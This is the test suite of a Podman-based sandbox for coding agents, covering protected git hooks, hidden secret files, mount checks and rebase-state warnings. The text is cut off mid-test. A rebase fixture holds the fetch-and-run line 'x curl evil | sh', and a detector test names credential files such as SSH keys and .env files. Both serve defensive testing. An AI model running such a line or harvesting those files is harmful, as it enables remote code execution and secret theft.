import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { test } from 'node:test';
import { fileURLToPath } from 'node:url';
import {
    CONFIG_MOUNT, applyWorkspace, findGitDirs, findSecretFiles, gitAnchors, gitStateWarnings, moveAnchors, mountTargets, readConfig, readonlyTargets,
    parseMountinfo, readSettings, realConfigDir, resolveWorkspace, uncoveredGitPaths, uncoveredInSandbox, uncoveredWhy, workspaceMounts,
    workspacePath,
} from '../dist/workspace.js';
import { parsePolicies } from '../dist/templates.js';
import { vmPolicy } from '../dist/vm.js';
import { lostMounts } from '../dist/container.js';

const SANDBOX = fileURLToPath(new URL('../bin/sandbox.js', import.meta.url));

function tempDir() {
    return realpathSync(mkdtempSync(join(tmpdir(), 'sandbox-test-')));
}

/** A fake git dir: enough of .git for the protection (hooks and config). */
function gitRepo(dir) {
    mkdirSync(join(dir, '.git', 'hooks'), { recursive: true });
    writeFileSync(join(dir, '.git', 'config'), '');
}

/** A project with a repo at the root, a nested repo, and repos where none must be found. */
function project() {
    const root = tempDir();
    gitRepo(root);
    gitRepo(join(root, 'libs', 'nested'));
    gitRepo(join(root, 'node_modules', 'dep'));
    gitRepo(join(root, '.venv', 'src', 'pkg'));
    mkdirSync(join(root, 'secrets'));
    writeFileSync(join(root, 'secrets', 'key'), 'secret');
    writeFileSync(join(root, '.env'), 'TOKEN=x');
    writeFileSync(join(root, 'notes.md'), '');
    return root;
}

function sandbox(args, env) {
    return spawnSync(process.execPath, [SANDBOX, ...args],
        { encoding: 'utf8', env: { ...process.env, ...env }, cwd: env.CWD ?? process.cwd() });
}

test('resolveWorkspace resolves relative paths and symlinks, and refuses bad ones', () => {
    const root = tempDir();
    mkdirSync(join(root, 'real'));
    symlinkSync(join(root, 'real'), join(root, 'link'));
    assert.equal(resolveWorkspace('real', root), join(root, 'real'));
    assert.equal(resolveWorkspace(join(root, 'link')), join(root, 'real'));
    writeFileSync(join(root, 'file'), '');
    mkdirSync(join(root, 'a,b'));
    assert.throws(() => resolveWorkspace(join(root, 'missing')), /does not exist/);
    assert.throws(() => resolveWorkspace(join(root, 'file')), /not a directory/);
    assert.throws(() => resolveWorkspace(join(root, 'a,b')), /comma/);
    assert.throws(() => resolveWorkspace('/'), /can't be \//);
});

test('findGitDirs finds repos at the root and nested, not in node_modules, .venv or hidden paths', () => {
    const root = project();
    assert.deepEqual(findGitDirs(root), [join(root, '.git'), join(root, 'libs', 'nested', '.git')]);
    assert.deepEqual(findGitDirs(root, [join(root, 'libs')]), [join(root, '.git')]);
});

test('findGitDirs refuses a .git file (worktree or submodule)', () => {
    const root = tempDir();
    gitRepo(root);
    mkdirSync(join(root, 'sub'));
    writeFileSync(join(root, 'sub', '.git'), 'gitdir: ../.git/modules/sub\n');
    assert.throws(() => findGitDirs(root), /sub\/\.git is a file/);
});

test('findGitDirs does not follow symlinks out of the workspace', () => {
    const root = tempDir();
    const outside = tempDir();
    gitRepo(outside);
    symlinkSync(outside, join(root, 'elsewhere'));
    assert.deepEqual(findGitDirs(root), []);
});

test('workspacePath stays inside the workspace and must exist', () => {
    const root = project();
    assert.equal(workspacePath(root, 'secrets', 'hide'), join(root, 'secrets'));
    assert.equal(workspacePath(root, 'secrets/../.env', 'hide'), join(root, '.env'));
    assert.throws(() => workspacePath(root, 'missing', 'hide'), /does not exist/);
    assert.throws(() => workspacePath(root, '../x', 'hide'), /not a path inside/);
    assert.throws(() => workspacePath(root, '.', 'readonly'), /not a path inside/);
    mkdirSync(join(root, 'a,b'));
    assert.throws(() => workspacePath(root, 'a,b', 'readonly'), /comma/);
    symlinkSync(join(root, 'secrets'), join(root, 'alias'));
    assert.throws(() => workspacePath(root, 'alias', 'hide'), /symlink/);
    assert.throws(() => workspacePath(root, 'alias/key', 'hide'), /under a symlink/);
});

test('workspaceMounts: git hooks and config, --readonly, --hide by type, the config folder', () => {
    const root = project();
    const nested = join(root, 'libs', 'nested');
    const configDir = join(root, 'sandboxes', 'box');
    const mounts = workspaceMounts({
        workspace: root,
        hide: [join(root, 'secrets'), join(root, '.env')],
        readonly: [join(root, 'notes.md')],
        configDir,
        gitDirs: findGitDirs(root),
    });
    const ro = (p) => `type=bind,source=${p},target=${p},readonly`;
    const self = (p) => `type=bind,source=${p},target=${p}`;
    assert.deepEqual(new Set(mounts), new Set([
        self(join(root, '.git')),
        self(join(root, 'libs')),
        self(nested),
        self(join(nested, '.git')),
        ro(join(root, '.git', 'config')),
        ro(join(root, '.git', 'hooks')),
        ro(join(nested, '.git', 'config')),
        ro(join(nested, '.git', 'hooks')),
        ro(join(root, 'notes.md')),
        ro(configDir),
        `type=tmpfs,target=${join(root, 'secrets')},notmpcopyup`,
        `type=bind,source=/dev/null,target=${join(root, '.env')},readonly`,
    ]));
    const order = mounts.map((m) => m.match(/target=([^,]+)/)[1].split('/').length);
    assert.deepEqual(order, [...order].sort((a, b) => a - b), 'outer paths first');
});

test('workspaceMounts leaves out the config folder when it is outside the workspace', () => {
    const root = project();
    const mounts = workspaceMounts({ workspace: root, configDir: join(tempDir(), 'box'), gitDirs: [] });
    assert.deepEqual(mounts, []);
});

test('workspaceMounts refuses a repo without hooks, which the agent could create', () => {
    const root = tempDir();
    mkdirSync(join(root, '.git'));
    writeFileSync(join(root, '.git', 'config'), '');
    assert.throws(() => workspaceMounts({ workspace: root, gitDirs: findGitDirs(root) }), /hooks is missing/);
});

test('applyWorkspace rewrites the config and records the choices', () => {
    const configDir = tempDir();
    mkdirSync(join(configDir, '.devcontainer'));
    const file = join(configDir, '.devcontainer', 'devcontainer.json');
    writeFileSync(file, JSON.stringify({
        workspaceFolder: '/workspace',
        workspaceMount: 'source=${localWorkspaceFolder},target=/workspace,type=bind',
        mounts: ['type=volume,source=x-home,target=/home/u,U=true'],
    }));
    applyWorkspace(configDir, { workspace: '/p', hide: ['.env'], readonly: [], mounts: ['m1'] });
    const config = JSON.parse(readFileSync(file, 'utf8'));
    assert.equal(config.workspaceMount, 'source=/p,target=/p,type=bind');
    assert.equal(config.workspaceFolder, '/p');
    assert.deepEqual(config.mounts, ['type=volume,source=x-home,target=/home/u,U=true', 'm1']);
    assert.deepEqual(readSettings(configDir), { workspace: '/p', hide: ['.env'], readonly: [] });
});

test('applyWorkspace drops the read-only /workspace/.devcontainer mount of the template', () => {
    // With --workspace the config stays outside the project (or is mounted read-only where it is).
    const configDir = tempDir();
    mkdirSync(join(configDir, '.devcontainer'));
    const file = join(configDir, '.devcontainer', 'devcontainer.json');
    writeFileSync(file, JSON.stringify({ mounts: ['type=volume,source=x-home,target=/home/u', CONFIG_MOUNT] }));
    applyWorkspace(configDir, { workspace: '/p', hide: [], readonly: [], mounts: ['m1'] });
    assert.deepEqual(JSON.parse(readFileSync(file, 'utf8')).mounts, ['type=volume,source=x-home,target=/home/u', 'm1']);
});

test('applyWorkspace refuses a config with comments rather than lose them', () => {
    const configDir = tempDir();
    mkdirSync(join(configDir, '.devcontainer'));
    writeFileSync(join(configDir, '.devcontainer', 'devcontainer.json'), '{\n  // a comment\n  "name": "x"\n}');
    assert.throws(() => applyWorkspace(configDir, { workspace: '/p', hide: [], readonly: [], mounts: [] }),
        /isn't plain JSON/);
});

test('uncoveredGitPaths compares against the read-only mount targets', () => {
    const gitDirs = ['/p/.git', '/p/sub/.git'];
    assert.deepEqual(uncoveredGitPaths(gitDirs, ['/p/.git/hooks', '/p/.git/config', '/p/sub/.git/hooks']),
        ['/p/sub/.git/config']);
    assert.deepEqual(uncoveredGitPaths(gitDirs, []).length, 4);
    // A read-only folder around a path covers it: a --readonly of the whole .git, or of the repo.
    assert.deepEqual(uncoveredGitPaths(gitDirs, ['/p/.git', '/p/sub']), []);
    assert.deepEqual(uncoveredGitPaths(gitDirs, ['/p/.gitx']).length, 4, 'a sibling with the same prefix covers nothing');
});

test('git-readonly: the whole .git is the protected path, and hooks and config alone don\'t cover it', () => {
    const root = project();
    const nested = join(root, 'libs', 'nested');
    const mounts = workspaceMounts({ workspace: root, gitDirs: findGitDirs(root), policies: ['git-readonly'] });
    const ro = (p) => `type=bind,source=${p},target=${p},readonly`;
    const self = (p) => `type=bind,source=${p},target=${p}`;
    // The folders above the nested .git are bound onto themselves (outer first), so they can't be moved.
    assert.deepEqual(mounts, [ro(join(root, '.git')), self(join(root, 'libs')), self(nested), ro(join(nested, '.git'))]);
    const gitDirs = ['/p/.git'];
    assert.deepEqual(uncoveredGitPaths(gitDirs, ['/p/.git/hooks', '/p/.git/config'], ['git-readonly']), ['/p/.git']);
    assert.deepEqual(uncoveredGitPaths(gitDirs, ['/p/.git'], ['git-readonly']), []);
});

test('gitAnchors: the folders from each repo up to the workspace, not the workspace, not in a read-only one', () => {
    const gitDirs = ['/w/.git', '/w/foo/.git', '/w/lab/30/deep/.git', '/w/lab/other/.git', '/w/ro/x/.git'];
    assert.deepEqual(gitAnchors('/w', gitDirs),
        ['/w/foo', '/w/lab', '/w/lab/30', '/w/lab/30/deep', '/w/lab/other', '/w/ro', '/w/ro/x']);
    assert.deepEqual(gitAnchors('/w', gitDirs, ['/w/ro', '/w/lab/30']),
        ['/w/foo', '/w/lab', '/w/lab/other'], 'a read-only folder can\'t be renamed, nor what is in it');
    assert.deepEqual(gitAnchors('/w', ['/w/.git']), [], 'a repo at the root needs none: the workspace is a mount point');
    // moveAnchors: without git-readonly each .git too (its hooks and config could move with it).
    assert.deepEqual(moveAnchors('/w', ['/w/.git', '/w/libs/x/.git', '/w/ro/y/.git'], ['/w/ro'], false),
        ['/w/.git', '/w/libs', '/w/libs/x', '/w/libs/x/.git']);
    assert.deepEqual(moveAnchors('/w', ['/w/.git', '/w/libs/x/.git'], [], true), ['/w/libs', '/w/libs/x']);
});

test('git-readonly: a --readonly folder above a repo stays read-only (no read-write self-bind over it)', () => {
    const root = project();
    const libs = join(root, 'libs');
    const mounts = workspaceMounts({ workspace: root, readonly: [libs], gitDirs: findGitDirs(root), policies: ['git-readonly'] });
    assert.ok(!mounts.some((m) => m.startsWith(`type=bind,source=${libs}`) && !m.endsWith(',readonly')), mounts.join('\n'));
    assert.deepEqual(mountTargets(mounts).filter((t) => !t.includes('.git')), [libs]);
});

test('uncoveredWhy tells a writable git path from a movable folder', () => {
    assert.equal(uncoveredWhy('/w/foo/.git'), ' (writable)');
    assert.equal(uncoveredWhy('/w/foo/.git/hooks'), ' (writable)');
    assert.equal(uncoveredWhy('/w/foo'), ' (could be moved away with the .git in it)');
    assert.equal(uncoveredWhy('/w/foo.git'), ' (could be moved away with the .git in it)');
});

test('parsePolicies: names, comma-separated or repeated; unknown and empty ones refused', () => {
    assert.deepEqual(parsePolicies([]), []);
    assert.deepEqual(parsePolicies(['git-readonly']), ['git-readonly']);
    assert.deepEqual(parsePolicies(['git-readonly,git-readonly', 'git-readonly']), ['git-readonly']);
    assert.deepEqual(parsePolicies(['no-vm', 'git-readonly']), ['git-readonly', 'no-vm']);
    assert.throws(() => parsePolicies(['git-readonly,nope']), /--policy nope: unknown policy; known: git-readonly, no-vm/);
    assert.throws(() => parsePolicies(['']), /--policy needs a name/);
    assert.throws(() => parsePolicies(['git-readonly,']), /--policy needs a name/);
});

test('readonlyTargets reads the read-only targets of a mounts list', () => {
    assert.deepEqual(readonlyTargets([
        'type=bind,source=/a,target=/a,readonly',
        'type=bind,source=/b,target=/b',
        'type=volume,source=v,target=/home/u,U=true',
        'type=bind,source=/dev/null,target=/p/.env,readonly',
        { type: 'bind', source: '/c', target: '/c' },
    ]), ['/a', '/p/.env']);
});

test('findSecretFiles: .env files, keys and key stores, not examples, .git, node_modules or hidden paths', () => {
    const root = project();   // has .env and secrets/key
    for (const file of ['.env.local', '.env.example', 'tls/server.pem', 'tls/server.key', 'store.p12',
        'deploy/id_ed25519', 'deploy/id_ed25519.pub', '.netrc', 'keys.md', 'node_modules/dep/test.pem', '.git/x.key',
        'home/.claude/.credentials.json', 'gcp/credentials.json', 'credentials.md']) {
        mkdirSync(join(root, file, '..'), { recursive: true });
        writeFileSync(join(root, file), '');
    }
    assert.deepEqual(findSecretFiles(root), ['.env', '.env.local', '.netrc', 'deploy/id_ed25519', 'gcp/credentials.json',
        'home/.claude/.credentials.json', 'store.p12', 'tls/server.key', 'tls/server.pem']);
    assert.deepEqual(findSecretFiles(root, [join(root, 'tls'), join(root, '.env'), join(root, 'home'), join(root, 'gcp')]),
        ['.env.local', '.netrc', 'deploy/id_ed25519', 'store.p12']);
});

test('an unreadable folder in the workspace is skipped, not a crash (the agent can\'t read it either)', () => {
    const root = project();
    mkdirSync(join(root, 'pgdata'));
    writeFileSync(join(root, 'pgdata', 'server.key'), '');
    chmodSync(join(root, 'pgdata'), 0o000);
    try {
        assert.deepEqual(findGitDirs(root), [join(root, '.git'), join(root, 'libs', 'nested', '.git')]);
        assert.deepEqual(findSecretFiles(root), ['.env']);
    } finally {
        chmodSync(join(root, 'pgdata'), 0o755);
    }
});

test('sandbox new --workspace warns about files that may hold secrets, unless hidden', () => {
    const root = project();
    writeFileSync(join(root, 'server.key'), '');
    const warned = sandbox(['new', 'w1', '--template', 'claude', '--workspace', root], { SANDBOX_DIR: tempDir() });
    assert.equal(warned.status, 0, warned.stderr);
    assert.match(warned.stderr, /warning: w1 can read files whose names suggest secrets:\n {2}\.env\n {2}server\.key\n/);
    assert.match(warned.stderr, /To hide them inside: rm -r .*\/w1, then this command again with --hide PATH/);
    const quiet = sandbox(['new', 'w2', '--template', 'claude', '--workspace', root, '--hide', '.env', '--hide', 'server.key'],
        { SANDBOX_DIR: tempDir() });
    assert.equal(quiet.status, 0, quiet.stderr);
    assert.doesNotMatch(quiet.stderr, /secrets/);
});

test('sandbox new --workspace on a project in SANDBOX_DIR under its own name: says so, never "rm -r" the project', () => {
    const sandboxes = tempDir();
    const root = join(sandboxes, 'foo');
    mkdirSync(root);
    gitRepo(root);
    for (const extra of [[], ['--inplace']]) {
        const result = sandbox(['new', '--template', 'offline', '--workspace', root, ...extra], { SANDBOX_DIR: sandboxes });
        assert.notEqual(result.status, 0);
        assert.match(result.stderr, new RegExp(`config folder would be ${root}, which is your project itself `
            + '\\(NAME defaults to the project folder\'s name, foo\\)'));
        assert.match(result.stderr, /sandbox new foo-sandbox --workspace /);
        assert.doesNotMatch(result.stderr, /rm -r/);
    }
    mkdirSync(join(sandboxes, 'group', 'app'), { recursive: true });
    const around = sandbox(['new', 'group', '--template', 'offline', '--workspace', join(sandboxes, 'group', 'app')],
        { SANDBOX_DIR: sandboxes });
    assert.match(around.stderr, /which contains your project/);
    assert.ok(!existsSync(join(root, '.devcontainer')) && !existsSync(join(root, 'sandbox.json')), 'the project is untouched');
    assert.equal(sandbox(['new', 'foo-box', '--template', 'offline', '--workspace', root], { SANDBOX_DIR: sandboxes }).status, 0);
});

test('already exists: rm -r only for a folder that holds nothing but config', () => {
    const sandboxes = tempDir();
    const env = { SANDBOX_DIR: sandboxes };
    // Made without --workspace: the folder is the sandbox's workspace, with the work in it.
    assert.equal(sandbox(['new', 'plain', '--template', 'offline'], env).status, 0);
    const plain = sandbox(['new', 'plain', '--template', 'offline'], env);
    assert.match(plain.stderr, /a sandbox made from a template, and its workspace/);
    assert.match(plain.stderr, new RegExp(`move the folder aside, with the work in it \\(mv ${sandboxes}/plain ${sandboxes}/plain\\.old\\)`));
    assert.doesNotMatch(plain.stderr, /rm -r/);
    // A folder sandbox didn't make.
    mkdirSync(join(sandboxes, 'mine'));
    const mine = sandbox(['new', 'mine', '--template', 'offline'], env);
    assert.match(mine.stderr, /a folder, not a sandbox[\s\S]*To use this NAME: +move the folder out of /);
    assert.doesNotMatch(mine.stderr, /rm -r|To use it:/);
    // --workspace: only config in it, the project elsewhere.
    const root = project();
    assert.equal(sandbox(['new', 'w', '--template', 'offline', '--workspace', root], env).status, 0);
    const ws = sandbox(['new', 'w', '--template', 'offline', '--workspace', root], env);
    assert.match(ws.stderr, new RegExp(`rm -r ${sandboxes}/w \\(only its config: ${root} stays\\)`));
});

test('realConfigDir resolves the part that exists', () => {
    const root = tempDir();
    symlinkSync(root, join(root, 'link'));
    assert.equal(realConfigDir(join(root, 'link', 'sandboxes', 'box')), join(root, 'sandboxes', 'box'));
});

test('sandbox new --workspace: config outside the project, nothing written into it', () => {
    const root = project();
    const sandboxes = tempDir();
    const result = sandbox(['new', '--template', 'claude', '--workspace', root, '--hide', 'secrets',
        '--hide', '.env', '--readonly', 'notes.md'], { SANDBOX_DIR: sandboxes });
    assert.equal(result.status, 0, result.stderr);
    const name = root.split('/').pop();   // NAME defaults to the folder's name
    const configDir = join(sandboxes, name);
    const config = JSON.parse(readFileSync(join(configDir, '.devcontainer', 'devcontainer.json'), 'utf8'));
    assert.equal(config.workspaceFolder, root);
    assert.equal(config.workspaceMount, `source=${root},target=${root},type=bind`);
    assert.ok(config.mounts.includes(`type=bind,source=${root}/.git/hooks,target=${root}/.git/hooks,readonly`));
    assert.ok(config.mounts[0].startsWith('type=volume'), "the template's own mounts come first");
    assert.deepEqual(readSettings(configDir), { workspace: root, hide: ['secrets', '.env'], readonly: ['notes.md'] });
    assert.ok(!existsSync(join(root, '.devcontainer')));
    assert.match(result.stdout, /2 git repos' hooks and config/);
});

test('sandbox new --workspace: relative path, config folder inside the workspace gets a read-only mount', () => {
    const root = project();
    const result = sandbox(['new', 'box', '--template', 'claude', '--workspace', '.'],
        { SANDBOX_DIR: join(root, 'sandboxes'), CWD: root });
    assert.equal(result.status, 0, result.stderr);
    const configDir = join(root, 'sandboxes', 'box');
    const config = JSON.parse(readFileSync(join(configDir, '.devcontainer', 'devcontainer.json'), 'utf8'));
    assert.equal(config.workspaceFolder, root);
    assert.ok(config.mounts.includes(`type=bind,source=${configDir},target=${configDir},readonly`));
});

test('sandbox new --workspace refuses bad input and leaves nothing behind', () => {
    const root = project();
    const sandboxes = tempDir();
    const env = { SANDBOX_DIR: sandboxes };
    const cases = [
        [['new', 'box', '--template', 'claude', '--workspace', join(root, 'missing')], /does not exist/],
        [['new', 'box', '--template', 'claude', '--workspace', root, '--hide', 'missing'], /does not exist/],
        [['new', 'box', '--template', 'claude', '--hide', 'secrets'], /need --workspace/],
        [['new', '--template', 'claude'], /usage/],
    ];
    for (const [args, message] of cases) {
        const result = sandbox(args, env);
        assert.equal(result.status, 1, args.join(' '));
        assert.match(result.stderr, message);
        assert.ok(!existsSync(join(sandboxes, 'box')), `nothing created for: ${args.join(' ')}`);
    }
});

test('the enter check: a repo added later is caught, in the config and in the container', () => {
    const root = project();
    const sandboxes = tempDir();
    assert.equal(sandbox(['new', 'box', '--template', 'claude', '--workspace', root, '--hide', 'secrets'],
        { SANDBOX_DIR: sandboxes }).status, 0);
    const configDir = join(sandboxes, 'box');
    assert.deepEqual(uncoveredInSandbox(configDir, null), []);

    gitRepo(join(root, 'added'));
    gitRepo(join(root, 'secrets', 'hidden-repo'));   // hidden inside, so not a problem
    // Its hooks and config (writable), and the folders that could be moved (added, added/.git).
    const writable = [join(root, 'added', '.git', 'hooks'), join(root, 'added', '.git', 'config')];
    const movable = [join(root, 'added'), join(root, 'added', '.git')];
    assert.deepEqual(uncoveredInSandbox(configDir, null), [...writable, ...movable].sort());

    // An existing container keeps its mounts: those count, not the config.
    const mounts = JSON.parse(readFileSync(join(configDir, '.devcontainer', 'devcontainer.json'), 'utf8')).mounts;
    const view = { readonly: [...readonlyTargets(mounts), ...writable], targets: [...mountTargets(mounts), ...writable, ...movable] };
    assert.deepEqual(uncoveredInSandbox(configDir, view), []);
    // Nothing mounted: 6 git paths (3 repos' hooks and config) and 6 folders (.git, libs, libs/nested,
    // libs/nested/.git, added, added/.git).
    assert.equal(uncoveredInSandbox(configDir, { readonly: [], targets: [] }).length, 12);
});

test('the enter check without git-readonly: a .git or a folder above one that could be moved is listed; '
    + 'a sandbox made before 0.11.0 (no .git bound onto itself) isn\'t asked for them', () => {
    const root = project();
    const sandboxes = tempDir();
    assert.equal(sandbox(['new', 'box', '--template', 'claude', '--workspace', root, '--hide', 'secrets'],
        { SANDBOX_DIR: sandboxes }).status, 0);
    const configDir = join(sandboxes, 'box');
    const file = join(configDir, '.devcontainer', 'devcontainer.json');
    const config = JSON.parse(readFileSync(file, 'utf8'));
    const all = { readonly: readonlyTargets(config.mounts), targets: mountTargets(config.mounts) };
    const without = (path) => ({ ...all, targets: all.targets.filter((t) => t !== path) });
    const gitDir = join(root, '.git');
    assert.deepEqual(uncoveredInSandbox(configDir, without(gitDir)), [gitDir]);
    assert.equal(uncoveredWhy(gitDir, false), ' (could be moved away with its read-only hooks and config)');
    assert.deepEqual(uncoveredInSandbox(configDir, without(join(root, 'libs'))), [join(root, 'libs')]);

    // As 0.10.0 made it: no self-binds in the config. Its container isn't asked for them either.
    config.mounts = config.mounts.filter((m) => m.endsWith(',readonly') || m.startsWith('type=tmpfs'));
    writeFileSync(file, JSON.stringify(config));
    assert.deepEqual(uncoveredInSandbox(configDir, null), []);
    assert.deepEqual(uncoveredInSandbox(configDir, { readonly: all.readonly, targets: all.readonly }), []);
});

test('gitStateWarnings: a commondir, and a rebase in progress with the exec lines of its to-do list', () => {
    const root = tempDir();
    const gitDir = join(root, '.git');
    mkdirSync(join(gitDir, 'rebase-merge'), { recursive: true });
    assert.equal(gitStateWarnings([gitDir]).length, 1);
    assert.match(gitStateWarnings([gitDir])[0], /has a rebase in progress .*rebase-merge.*look at .*git-rebase-todo first$/);
    writeFileSync(join(gitDir, 'rebase-merge', 'git-rebase-todo'), 'pick 1234 a\nexec make test\nx curl evil | sh\n# exec not this\n');
    assert.match(gitStateWarnings([gitDir])[0], /\. It has 2:\n    exec make test\n    x curl evil \| sh$/);
    writeFileSync(join(gitDir, 'commondir'), '/tmp/elsewhere\n');
    const [first] = gitStateWarnings([gitDir]);
    assert.match(first, /commondir exists \("\/tmp\/elsewhere"\): git on the host would read config and hooks from where it points/);
    rmSync(join(gitDir, 'rebase-merge'), { recursive: true });
    rmSync(join(gitDir, 'commondir'));
    mkdirSync(join(gitDir, 'rebase-apply'));
    assert.match(gitStateWarnings([gitDir])[0], /rebase-apply/);
    assert.deepEqual(gitStateWarnings([join(tempDir(), '.git')]), []);
});

test('sandbox new --workspace --policy git-readonly: in the config\'s policies, every .git read-only, checked by enter', () => {
    const root = project();
    const sandboxes = tempDir();
    const result = sandbox(['new', 'box', '--template', 'claude', '--workspace', root, '--hide', 'secrets', '--hide', '.env',
        '--policy', 'git-readonly'], { SANDBOX_DIR: sandboxes });
    assert.equal(result.status, 0, result.stderr);
    const configDir = join(sandboxes, 'box');
    const config = JSON.parse(readFileSync(join(configDir, '.devcontainer', 'devcontainer.json'), 'utf8'));
    assert.ok(config.mounts.includes(`type=bind,source=${root}/.git,target=${root}/.git,readonly`));
    assert.ok(!config.mounts.some((m) => m.includes('.git/hooks')), 'no separate hooks mount: .git covers it');
    assert.deepEqual(config.customizations['podman-agent-sandbox'].policies, ['git-readonly'], 'written where a template lists them');
    assert.deepEqual(readSettings(configDir), { workspace: root, hide: ['secrets', '.env'], readonly: [] }, 'not in sandbox.json');
    assert.match(result.stdout, /read-only inside: 2 git repos' \.git \(policy git-readonly\)/);
    assert.deepEqual(uncoveredInSandbox(configDir, null), []);

    const libs = join(root, 'libs');
    const nested = join(libs, 'nested');
    assert.ok(config.mounts.includes(`type=bind,source=${libs},target=${libs}`), 'the folders above a nested .git: self-binds');
    assert.ok(config.mounts.includes(`type=bind,source=${nested},target=${nested}`));

    // A container with only hooks and config read-only doesn't satisfy the policy.
    const partial = [join(root, '.git', 'hooks'), join(root, '.git', 'config'),
        join(nested, '.git', 'hooks'), join(nested, '.git', 'config')];
    assert.deepEqual(uncoveredInSandbox(configDir, { readonly: partial, targets: [...partial, libs, nested] }),
        [join(root, '.git'), join(nested, '.git')]);
    // One made before the self-binds (0.10.0's first cut): every .git read-only, but libs/nested could be moved.
    const gitOnly = [join(root, '.git'), join(nested, '.git')];
    assert.deepEqual(uncoveredInSandbox(configDir, { readonly: gitOnly, targets: gitOnly }), [libs, nested]);
    gitRepo(join(root, 'added'));
    assert.deepEqual(uncoveredInSandbox(configDir, null), [join(root, 'added'), join(root, 'added', '.git')]);
});

test('sandbox new --policy: git-readonly needs --workspace, --inplace needs --template, unknown names refused; nothing made', () => {
    const root = project();
    const sandboxes = tempDir();
    for (const [args, message] of [
        [['new', 'box', '--template', 'claude', '--policy', 'git-readonly'], /--policy git-readonly needs --workspace/],
        [['new', 'box', '--template', 'claude', '--workspace', root, '--policy', 'git-readonly,nope'], /--policy nope: unknown policy/],
        [['new', 'box', '--workspace', root, '--inplace', '--policy', 'git-readonly'], /--policy with --inplace needs --template/],
    ]) {
        const result = sandbox(args, { SANDBOX_DIR: sandboxes });
        assert.equal(result.status, 1, args.join(' '));
        assert.match(result.stderr, message);
        assert.ok(!existsSync(join(sandboxes, 'box')), `nothing created for: ${args.join(' ')}`);
    }
});

test('sandbox new --policy no-vm: in the config\'s policies, without --workspace too, and the VM check sees it', () => {
    const sandboxes = tempDir();
    const result = sandbox(['new', 'box', '--template', 'claude', '--policy', 'no-vm'], { SANDBOX_DIR: sandboxes });
    assert.equal(result.status, 0, result.stderr);
    const config = readConfig(join(sandboxes, 'box', '.devcontainer', 'devcontainer.json'));
    assert.deepEqual(config.customizations['podman-agent-sandbox'].policies, ['no-vm']);
    assert.equal(config.customizations['podman-agent-sandbox'].agent, 'claude-code', 'the rest of the marker stays');
    assert.equal(vmPolicy(config).allowed, false);
});

test('a template that lists git-readonly gets every .git read-only, without --policy', () => {
    const root = project();
    const sandboxes = tempDir();
    const template = join(tempDir(), 'strict');
    mkdirSync(join(template, '.devcontainer'), { recursive: true });
    const offline = fileURLToPath(new URL('../templates/offline/', import.meta.url));
    const config = JSON.parse(readFileSync(join(offline, '.devcontainer', 'devcontainer.json'), 'utf8'));
    config.customizations['podman-agent-sandbox'].policies = ['git-readonly'];
    writeFileSync(join(template, '.devcontainer', 'devcontainer.json'), JSON.stringify(config, null, 2));
    writeFileSync(join(template, '.devcontainer', 'Containerfile'), readFileSync(join(offline, '.devcontainer', 'Containerfile')));
    writeFileSync(join(template, 'devcontainer-template.json'), readFileSync(join(offline, 'devcontainer-template.json')));
    const result = sandbox(['new', 'box', '--template', template, '--workspace', root, '--hide', 'secrets', '--hide', '.env'],
        { SANDBOX_DIR: sandboxes });
    assert.equal(result.status, 0, result.stderr);
    const made = readConfig(join(sandboxes, 'box', '.devcontainer', 'devcontainer.json'));
    assert.ok(made.mounts.includes(`type=bind,source=${root}/.git,target=${root}/.git,readonly`));
    assert.match(result.stdout, /\.git \(policy git-readonly\)/);
});

test('the enter check ignores sandboxes made without --workspace', () => {
    const sandboxes = tempDir();
    assert.equal(sandbox(['new', 'plain', '--template', 'claude'], { SANDBOX_DIR: sandboxes }).status, 0);
    assert.deepEqual(uncoveredInSandbox(join(sandboxes, 'plain'), null), []);
});

test('every bundled template works with --workspace (plain JSON config)', () => {
    const templates = fileURLToPath(new URL('../templates/', import.meta.url));
    for (const id of ['claude', 'mitm-proxy', 'offline', 'proxy-client']) {
        JSON.parse(readFileSync(join(templates, id, '.devcontainer', 'devcontainer.json'), 'utf8'));
    }
});

test('readConfig refuses JSON that is no devcontainer.json, with a message, not a TypeError', () => {
    const dir = tempDir();
    const file = join(dir, 'devcontainer.json');
    for (const json of ['null', '[]', '"x"', '{"mounts": "type=bind,source=/a,target=/a"}']) {
        writeFileSync(file, json);
        assert.throws(() => readConfig(file), (err) => err.name === 'Error' && /isn't a devcontainer.json/.test(err.message), json);
    }
    writeFileSync(file, '{"mounts": [], "image": "x"}');
    assert.deepEqual(readConfig(file), { mounts: [], image: 'x' });
});

test('readSettings refuses a sandbox.json without the fields sandbox reads', () => {
    const dir = tempDir();
    const file = join(dir, 'sandbox.json');
    for (const json of ['null', '{}', '{"workspace": 1}', '{"workspace": "/p", "hide": ".env"}',
        '{"workspace": "/p", "readonly": [1]}', '{"workspace": "/p", "inplace": "yes"}', '{"workspace": "/p", "configTree": 7}']) {
        writeFileSync(file, json);
        assert.throws(() => readSettings(dir), (err) => err.name === 'Error' && /isn't a sandbox.json/.test(err.message), json);
    }
    const settings = { workspace: '/p', hide: ['.env'], readonly: [], inplace: true, configTree: 'abc' };
    writeFileSync(file, JSON.stringify(settings));
    assert.deepEqual(readSettings(dir), settings);
});

test('readConfig and readonlyTargets take null mounts as none, as the Dev Containers CLI does', () => {
    const file = join(tempDir(), 'devcontainer.json');
    writeFileSync(file, '{"image": "x", "mounts": null}');
    assert.deepEqual(readConfig(file), { image: 'x', mounts: null });
    assert.deepEqual(readonlyTargets(null), []);
});

test('parseMountinfo: the mounts really there; the top one of a stack decides read-only; escaped names', () => {
    const text = [
        '30 1 0:30 / / rw,relatime - overlay overlay rw',
        '31 30 8:1 /w /w rw,relatime - ext4 /dev/sda1 rw',
        '32 31 8:1 /w/.git /w/.git ro,relatime - ext4 /dev/sda1 rw',
        '33 31 8:1 /w/a\\040b /w/a\\040b rw,relatime - ext4 /dev/sda1 rw',
        '34 31 8:1 /w/x /w/x ro - ext4 /dev/sda1 rw',
        '35 34 8:1 /w/x /w/x rw - ext4 /dev/sda1 rw',
        '',
    ].join('\n');
    assert.deepEqual(parseMountinfo(text), { readonly: ['/w/.git'], targets: ['/', '/w', '/w/.git', '/w/a b', '/w/x'] });
});

test('lostMounts: a recorded mount missing inside, or writable though made read-only', () => {
    const live = { readonly: ['/w/.git'], targets: ['/w', '/w/.git', '/w/cfg'] };
    const warnings = lostMounts([{ Destination: '/w', RW: true }, { Destination: '/w/.git', RW: false },
